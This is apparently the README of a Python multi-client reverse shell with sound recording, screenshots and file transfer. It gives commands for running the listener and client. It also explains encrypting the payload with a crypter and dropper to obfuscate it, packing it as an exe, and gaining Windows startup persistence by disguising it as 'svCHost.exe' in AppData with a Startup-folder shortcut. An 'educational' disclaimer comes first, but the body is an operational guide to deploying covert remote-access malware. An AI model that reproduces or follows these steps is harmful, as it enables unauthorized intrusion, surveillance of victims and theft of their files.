# Disclaimer

This is just for educational purpose only.This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.Do not attempt to violate the law with anything contained here.We will not be responsible for your any illegal actions.
***
# Multiclient-Reverse-shell
Reverse shell using socket programming in python.
With features like sound recording, screenshot,upload and download files.
***
# Prerequisite
* python 3.7.x
***
# How to Use

To use this reverse shell, two scripts need to be running

* **server/server.py** - runs on server and waits for clients to connect.(listens on 4444 port)
* **client/client.py** - connects to a remote server.

***

## Server

To set up server script, simply run **server.py**.\
`python server.py`\
You will get an interactive prompt.\
To list all current connections:\
`shell> list`\
To select a target from the list of clients:\
`shell> select 0`

***

## Client

In **client.py** , simply run or change the ip address of the server in the client.py file.
`python client.py`
***
## For obfuscation
$ cd crypter\
$ python crypter.py ../client/client.py \
which will create a encrypted payload using fernet encryption method.\
$ type encrypted_payload.txt (copy this) \
To execute encrypted payload use dropper.py.\
change the value of data variable in dropper.py file with the encrypted_payload.txt content.\
Than run:\
$python dropper.py
***
## Create Exe file.
To Create exe file of client.py run auto_py_to_exe command in terminal.
***
## To run at startup (Windows os)
$copy Run_at_Startup/run_at_startup.py Run_at_Startup/copy.py\
$copy Run_at_Startup/client_payload.py Run_at_Startup/svCHost.py\
$cd crypter\
$python crypter.py ../Run_at_Startup/copy.py\
which will create a encrypted_payload.txt.(copy its content)\
change the value of data variable in dropper/dropper.py file with the encrypted_payload.txt content.\
$copy dropper.py copy.py\
And than create its exe\
$python crypter.py ../Run_at_Startup/svCHost.py\
which will create a encrypted_payload.txt (copy its content).\
change the value of data variable in dropper/dropper.py file with the encrypted_payload.txt content.\
$copy dropper.py svCHost.py\
And than create its exe.

To put both the exe at some location and just run copy.exe to it will copy the svCHost.exe in C:\Users\<username>\AppData\Local\Microsoft or C:\Users\<username>\AppData\Local\Microsoft\office and creates its shortcut in startup folder.
***
# Pyaudio error
try this:\
$pipwin install pyaudio\
or\
refer to this:https://stackoverflow.com/questions/52283840/i-cant-install-pyaudio-on-windows-how-to-solve-error-microsoft-visual-c-14
